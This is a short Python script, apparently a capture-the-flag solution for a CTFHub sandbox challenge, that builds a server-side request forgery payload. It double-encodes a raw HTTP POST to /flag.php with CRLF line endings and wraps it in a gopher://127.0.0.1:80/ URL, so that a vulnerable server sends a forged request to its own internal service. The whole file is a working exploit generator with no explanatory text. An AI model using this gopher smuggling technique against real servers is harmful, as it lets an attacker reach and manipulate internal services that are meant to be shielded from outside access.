txt = """POST /flag.php HTTP/1.1
Host: challenge-85c812e011304b2a.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 36

key=83870d737ab1f19c6efb5ddd3cc8654d"""
from urllib.parse import quote

encoded_string = quote(txt)
encoded_string = encoded_string.replace('%0A', '%0D%0A')
encoded_string = quote(encoded_string)
encoded_string = 'gopher://127.0.0.1:80/_' + encoded_string
# todo: test

print(encoded_string)
